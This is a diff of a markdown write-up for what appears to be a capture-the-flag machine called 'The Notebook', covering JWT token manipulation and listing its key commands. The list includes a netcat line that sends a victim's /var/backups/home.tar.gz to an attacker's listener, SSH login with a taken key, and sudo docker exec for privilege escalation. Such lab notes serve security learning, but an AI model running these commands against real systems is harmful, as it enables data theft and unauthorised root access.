@@ -12,14 +12,14 @@ The Notebook introduces us to jwt token manipulation. Lots of interesting lesson
 **-------------------------------------------------------------------------------------------------------------------------------**
 
 ### Important Commands:
-'- ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key
+- ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key
 - openssl rsa -in privKey.key -pubout -outform PEM -out privKey.key.pub
 - nc -N 10.10.16.160 1717 < /var/backups/home.tar.gz
 - nc -nvlp 1717 > home.tar.gz
 - ssh -i id_rsa noah@10.10.10.230 
 - Sudo -l
 - sudo /usr/bin/docker exec -it webapp-dev01 bash
-- go build main.go'
+- go build main.go
 
 **-------------------------------------------------------------------------------------------------------------------------------**
 
